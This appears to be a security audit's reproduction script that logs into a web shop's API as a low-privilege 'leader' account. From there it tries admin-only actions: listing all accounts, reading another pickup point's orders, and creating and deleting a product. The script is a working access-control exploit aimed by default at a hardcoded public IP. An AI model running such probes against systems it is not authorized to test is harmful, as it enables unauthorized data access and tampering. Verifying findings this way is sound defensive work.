// f-001: backend enforces no role authorization - any logged-in user reaches every API.
// Expected (basis: frontend router meta.role + Accounts page "三端登录账号：管理员/团长/配送员",
// admin-only pages /admin/accounts, /admin/products, and leader's bound point refId=1):
//   - LEADER calling GET /auth/accounts (admin-only account list) -> 401/403
//   - LEADER reading another point's orders (pickupPointId=2, leader1 binds point 1) -> 403/empty
//   - LEADER creating/deleting a product (admin-only write) -> 403
// Exit 1 if any of these succeed (= problem reproduces).
const BASE = process.env.TARGET ?? "http://8.155.17.234:50080";

async function api(token, method, path, body) {
	const res = await fetch(`${BASE}/api${path}`, {
		method,
		headers: { ...(token ? { "X-Token": token } : {}), ...(body ? { "content-type": "application/json" } : {}) },
		body: body ? JSON.stringify(body) : undefined,
	});
	const text = await res.text();
	let json;
	try { json = JSON.parse(text); } catch { json = text; }
	return { status: res.status, json };
}

async function login(username, password) {
	const r = await api(null, "POST", "/auth/login", { username, password });
	if (!r.json || r.json.code !== 200) throw new Error(`login ${username} failed: ${JSON.stringify(r.json)}`);
	return r.json.data;
}

let createdProductId = null;
let failures = [];
try {
	const leader = await login("leader1", "<redacted>");
	console.log(`logged in leader1: role=${leader.role} refId=${leader.refId} (${leader.refName})`);

	// 1) vertical: admin-only account list
	const acc = await api(leader.token, "GET", "/auth/accounts");
	const accCount = Array.isArray(acc.json?.data) ? acc.json.data.length : -1;
	console.log(`[1] leader1 GET /auth/accounts -> http=${acc.status} code=${acc.json?.code} accounts=${accCount}`);
	if (acc.json?.code === 200 && accCount > 0) {
		failures.push(`LEADER can list all ${accCount} system accounts (admin-only endpoint)`);
	}

	// 2) horizontal: another point's orders
	const other = await api(leader.token, "GET", "/order/list?pickupPointId=2");
	const otherOrders = Array.isArray(other.json?.data) ? other.json.data : [];
	const foreign = otherOrders.filter((o) => o.pickupPointId !== leader.refId);
	console.log(`[2] leader1 GET /order/list?pickupPointId=2 -> http=${other.status} orders=${otherOrders.length} foreign=${foreign.length}`);
	if (foreign.length > 0) {
		failures.push(`LEADER reads ${foreign.length} orders of pickup point(s) ${[...new Set(foreign.map((o) => o.pickupPointId))]} not bound to them`);
	}

	// 3) vertical write: create a product via an admin-only page
	const name = `prelude-test-authz-${Date.now()}`;
	const save = await api(leader.token, "POST", "/product/save", {
		name, category: "日用百货", spec: "1件", price: 1.5, unit: "份", supplier: "prelude-test", status: 1,
	});
	console.log(`[3a] leader1 POST /product/save -> http=${save.status} code=${save.json?.code}`);
	const list = await api(leader.token, "GET", "/product/list");
	const mine = (Array.isArray(list.json?.data) ? list.json.data : []).find((p) => p.name === name);
	if (mine) {
		createdProductId = mine.id;
		failures.push(`LEADER created product id=${mine.id} via admin-only POST /product/save`);
	}

	// cleanup: delete the created product (also proves delete escalation)
	if (createdProductId !== null) {
		const del = await api(leader.token, "DELETE", `/product/${createdProductId}`);
		console.log(`[3b] leader1 DELETE /product/${createdProductId} -> http=${del.status} code=${del.json?.code}`);
		const after = await api(leader.token, "GET", "/product/list");
		const still = (Array.isArray(after.json?.data) ? after.json.data : []).find((p) => p.id === createdProductId);
		if (!still) { console.log(`[3c] cleanup ok: product ${createdProductId} removed`); createdProductId = null; }
		else failures.push(`LEADER cannot delete product (cleanup incomplete)`);
	}
} catch (e) {
	console.log("could not run:", e.message);
	process.exit(0); // unable to prove the problem
}

// best-effort cleanup so repeated runs do not accumulate data
if (createdProductId !== null) {
	try {
		const admin = await login("admin", "<redacted>");
		await api(admin.token, "DELETE", `/product/${createdProductId}`);
		console.log(`cleanup via admin: product ${createdProductId} deleted`);
	} catch (e) { console.log("cleanup failed:", e.message); }
}

if (failures.length) {
	console.log("\nPROBLEM REPRODUCED:");
	for (const f of failures) console.log("  - " + f);
	process.exit(1);
}
console.log("\nno unauthorized access observed");
process.exit(0);